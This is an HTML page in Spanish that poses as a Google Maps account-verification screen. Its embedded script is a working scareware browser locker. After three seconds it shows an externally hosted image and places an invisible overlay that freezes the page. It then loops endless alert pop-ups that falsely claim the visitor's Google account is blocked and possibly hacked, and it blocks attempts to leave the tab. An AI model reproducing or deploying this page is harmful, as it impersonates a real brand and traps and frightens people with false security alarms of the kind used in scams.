<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Verificando cuenta</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html,
        body {
            width: 100%;
            height: 100%;
            background: #ffffff;
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
            cursor: default;
        }

        .capa-congelada {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9998;
            background: transparent;
            pointer-events: all;
            display: none;
        }

        .capa-congelada.activa {
            display: block;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 1.8rem;
            padding: 2rem 1.5rem;
            max-width: 420px;
            width: 100%;
            background: transparent;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1;
            transition: opacity 0.5s ease;
            pointer-events: none;
        }

        .container.oculto {
            opacity: 0;
            pointer-events: none;
        }

        .google-maps-logo {
            display: flex;
            align-items: center;
            gap: 10px;
            pointer-events: none;
        }

        .maps-icon {
            position: relative;
            width: 44px;
            height: 44px;
            flex-shrink: 0;
        }

        .pin {
            width: 100%;
            height: 100%;
            background: #1a73e8;
            border-radius: 50% 50% 50% 0;
            transform: rotate(-45deg);
            position: relative;
            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.3);
        }

        .pin::after {
            content: '';
            position: absolute;
            width: 18px;
            height: 18px;
            background: white;
            border-radius: 50%;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(45deg);
        }

        .maps-text {
            font-size: 1.5rem;
            font-weight: 500;
            color: #1f1f1f;
            letter-spacing: -0.5px;
            pointer-events: none;
        }

        .maps-text span {
            font-weight: 400;
            color: #5f6368;
        }

        .loader {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            border: 5px solid #e8eaed;
            border-top: 5px solid #1a73e8;
            border-right: 5px solid #1a73e8;
            animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
            flex-shrink: 0;
            margin-top: 0.5rem;
            pointer-events: none;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .status-text {
            color: #202124;
            font-size: 1.1rem;
            font-weight: 500;
            letter-spacing: 0.2px;
            text-align: center;
            pointer-events: none;
        }

        .status-text .light {
            font-weight: 400;
            color: #5f6368;
        }

        .divider {
            width: 100%;
            max-width: 200px;
            height: 1px;
            background: #dadce0;
            margin: 0.2rem 0;
            pointer-events: none;
        }

        .sub-text {
            color: #5f6368;
            font-size: 0.85rem;
            font-weight: 400;
            text-align: center;
            line-height: 1.5;
            pointer-events: none;
        }

        .imagen-fondo {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            display: none;
            background: #000000;
            justify-content: center;
            align-items: center;
        }

        .imagen-fondo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .imagen-fondo.activa {
            display: flex;
        }

        @media (max-width: 480px) {
            .maps-text {
                font-size: 1.2rem;
            }
            .maps-icon {
                width: 36px;
                height: 36px;
            }
            .loader {
                width: 40px;
                height: 40px;
                border-width: 4px;
            }
            .status-text {
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <div id="capaCongelada" class="capa-congelada"></div>

    <div id="imagenFondo" class="imagen-fondo">
        <img id="imagenMostrada" src="" alt="Verificación de seguridad" />
    </div>

    <div id="contenedorPrincipal" class="container">
        <div class="google-maps-logo">
            <div class="maps-icon">
                <div class="pin"></div>
            </div>
            <div class="maps-text">
                Google <span>Maps</span>
            </div>
        </div>

        <div class="loader" role="status" aria-label="Cargando"></div>

        <div class="status-text">
            Verificando <span class="light">cuenta</span>
        </div>

        <div class="divider"></div>

        <div class="sub-text">
            Esto puede tomar unos segundos
        </div>
    </div>

    <script>
        (function() {
            const URL_IMAGEN = "https://i.postimg.cc/7Y6HFY9m/IMG-20260902-153111.jpg";
            const TIEMPO_ALERTA = 3000;
            const MENSAJE_ALERTA =
                "Peligro, su cuenta ha sido bloqueada. Hemos detectado un dispositivo con acceso a su cuenta de Google, posiblemente hackeada.";

            let alertaActiva = false;
            let imagenActivada = false;
            let pantallaCongelada = false;

            const capaCongelada = document.getElementById('capaCongelada');
            const imagenFondo = document.getElementById('imagenFondo');
            const imgElement = document.getElementById('imagenMostrada');
            const contenedor = document.getElementById('contenedorPrincipal');

            // Intentar evitar el cierre de la pestaña
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = '';
                return '';
            });

            function congelarPantalla() {
                if (pantallaCongelada) return;
                pantallaCongelada = true;
                capaCongelada.classList.add('activa');
            }

            function activarImagenFondo() {
                if (imagenActivada) return;
                imagenActivada = true;
                imgElement.src = URL_IMAGEN;
                imagenFondo.classList.add('activa');
                contenedor.classList.add('oculto');
            }

            // Bucle infinito de alertas (sin recargar ni abrir pestañas)
            function bucleInfinitoAlertas() {
                activarImagenFondo();
                congelarPantalla();

                // Mostrar la alerta
                alert(MENSAJE_ALERTA);

                // Programar la siguiente alerta inmediatamente
                // Usamos setTimeout para evitar stack overflow
                setTimeout(bucleInfinitoAlertas, 50);
            }

            function iniciarBucle() {
                if (alertaActiva) return;
                alertaActiva = true;
                // Pequeño retraso para que la página cargue bien
                setTimeout(bucleInfinitoAlertas, 100);
            }

            // Esperar 3 segundos para la primera alerta
            setTimeout(iniciarBucle, TIEMPO_ALERTA);

            console.log("⚠️ Bucle infinito de alertas activado. Para salir: Ctrl+W o cerrar navegador.");
        })();
    </script>
</body>
</html>
